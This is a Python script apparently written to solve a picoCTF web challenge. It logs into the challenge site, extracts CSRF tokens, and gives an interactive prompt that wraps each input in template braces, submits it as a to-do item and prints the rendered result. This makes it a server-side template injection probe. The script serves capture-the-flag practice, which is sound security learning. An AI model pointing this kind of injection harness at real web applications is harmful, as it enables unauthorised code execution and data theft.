import re
import html
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class Empire2(object):
    BASE_URL = "https://2019shell1.picoctf.com/problem/21884"
    
    def __init__(self):
        self.session = requests.Session() 
        
    def login(self, username, password):
        text = self.post(self.BASE_URL + "/login", {"username": username, "password": password})
        if "Invalid username or password" in text:
            raise Exception("Can't login")

    def post(self, uri, data):
        r = self.session.get(uri, headers = {"Referer": uri})
        csrf = self.get_csrf_token(r.text)
        d = {"csrf_token": csrf}
        d.update(data)
        r = self.session.post(uri, data = d, allow_redirects = True, headers = {"Referer": uri})
        if r.status_code != 200:
            raise Exception("Can't post to '{}'".format(uri))
        return r.text

    def add_item(self, item):
        text = self.post(self.BASE_URL + "/add_item", {"item": item})
        if "Item Added" not in text:
            raise Exception("Can't add item '{}'".format(item))

    def get_last_item(self):
        r = self.session.get(self.BASE_URL + "/list_items")

        # Due to a bug in the website, there is an incorrect "</body>" tag in the middle of the source code.
        # This causes BeautifulSoup to fail, so we just remote it
        html = r.text.replace("</body>", "", 1) 

        parsed_html = BeautifulSoup(html, "lxml")
        return parsed_html.body.find_all('div', attrs={'class':'well well-sm'})[-1].findChildren("li" , recursive=False)[0].get_text().replace("Very Urgent: ", "")


    def get_csrf_token(self, html):
        token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="([^"]+)">', html, re.MULTILINE)
        if token is None:
            raise Exception("Can't find CSRF token")
        return token.group(1)

class MyPrompt(Cmd):
    def __init__(self):
        Cmd.__init__(self)
        self.site = Empire2()
        self.site.login("user", "password")
        print "Logged in"

    def do_exit(self, inp):
        return True
 
    def do_send(self, param):
        # Literal curly brackets are escaped by another set of curly brackets
        q = "{{{{{}}}}}".format(param) 
        print "Sending: '{}'".format(q)
        self.site.add_item(q)
        print self.site.get_last_item()
 
MyPrompt().cmdloop()